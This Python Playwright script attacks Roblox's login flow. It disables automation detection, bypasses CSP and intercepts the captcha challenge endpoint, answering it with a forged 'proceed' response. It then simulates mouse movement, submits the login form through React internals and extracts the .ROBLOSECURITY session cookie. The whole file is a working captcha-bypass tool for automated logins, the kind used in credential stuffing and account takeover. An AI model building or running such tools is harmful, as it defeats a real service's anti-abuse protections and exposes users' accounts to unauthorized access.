"""Intercept /challenge/v1/continue, bypass with spoofed response (no route.fetch)."""
import os, time, json
os.system("taskkill /F /IM chrome.exe 2>NUL")
time.sleep(2)

from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=False, args=["--disable-blink-features=AutomationControlled"])
    ctx = browser.new_context(bypass_csp=True)
    page = ctx.new_page()
    
    result = {"continue_called": False, "login_retry": False, "login_success": False}
    
    def handle_continue(route, request):
        if "/challenge/v1/continue" in request.url and request.method == "POST":
            print(f"\n[ROUTE] Intercepted /challenge/v1/continue", flush=True)
            result["continue_called"] = True
            
            # Spoof a "proceed" response - no captcha needed
            fake_resp = json.dumps({
                "challengeId": "bypassed",
                "challengeType": "proceed"
            })
            route.fulfill(status=200, content_type="application/json", body=fake_resp)
            print(f"  Fulfilled with: {fake_resp}", flush=True)
        else:
            route.continue_()
    
    page.route("**/challenge/v1/continue**", handle_continue)
    
    def on_req(req):
        url = req.url
        if "/v2/login" in url and req.method == "POST":
            h = dict(req.headers)
            has_ch = any("rblx-challenge" in k.lower() for k in h)
            if has_ch:
                result["login_retry"] = True
                print(f"\n*** LOGIN RETRY WITH CHALLENGE HEADERS ***", flush=True)
    
    def on_resp(resp):
        url = resp.url
        if "/v2/login" in url:
            try:
                b = resp.body()[:300]
                if resp.status == 200:
                    result["login_success"] = True
                    print(f"\n*** LOGIN SUCCESS! {b} ***", flush=True)
                else:
                    print(f"[RESP] /v2/login {resp.status} {b}", flush=True)
            except:
                print(f"[RESP] /v2/login {resp.status}", flush=True)
    
    page.on("request", on_req)
    page.on("response", on_resp)
    
    page.goto("https://www.roblox.com/login", wait_until="domcontentloaded", timeout=30000)
    time.sleep(5)
    
    page.evaluate("""() => {
        for (let i = 0; i < 30; i++)
            document.dispatchEvent(new MouseEvent('mousemove', {clientX: 100+i*20, clientY: 200+i*5, bubbles: true}));
        document.querySelector('input[name="username"]')?.focus();
    }""")
    time.sleep(1)
    page.fill('input[name="username"]', 'testuser123')
    time.sleep(0.5)
    page.fill('input[name="password"]', 'TestPassword123!')
    time.sleep(1)
    page.evaluate("""() => {
        for (let i = 0; i < 15; i++)
            document.dispatchEvent(new MouseEvent('mousemove', {clientX: 500+i*20, clientY: 300+i*5, bubbles: true}));
    }""")
    time.sleep(0.5)
    
    page.evaluate("""() => {
        const root = document.querySelector('#login-base') || document.body;
        const key = Object.keys(root).find(k => k.startsWith('__reactFiber'));
        function walk(f, d) {
            if (!f || d > 20) return null;
            if (f.memoizedProps && typeof f.memoizedProps.onFormSubmit === 'function') {
                f.memoizedProps.onFormSubmit();
                return 'ok';
            }
            return walk(f.child, d+1) || walk(f.sibling, d);
        }
        return walk(root[key], 0);
    }""")
    print(f"[t=0] Submitted", flush=True)
    
    for i in range(20):
        time.sleep(1)
        if result["login_retry"]:
            print(f"[t={i+1}] LOGIN RETRY! Waiting for response...", flush=True)
            time.sleep(3)
            break
        if result["continue_called"]:
            print(f"[t={i+1}] Continue intercepted, waiting for retry...", flush=True)
        if i % 5 == 4:
            print(f"[t={i+1}] continue={result['continue_called']} retry={result['login_retry']}", flush=True)
    
    print(f"\n=== RESULTS ===", flush=True)
    for k, v in result.items():
        print(f"  {k}: {v}", flush=True)
    
    cookies = ctx.cookies()
    rs = [c for c in cookies if ".ROBLOSECURITY" in c["name"]]
    print(f"\nROBLOSECURITY: {len(rs)}", flush=True)
    if rs:
        print(f"Session: {rs[0]['value'][:60]}...", flush=True)
    
    browser.close()
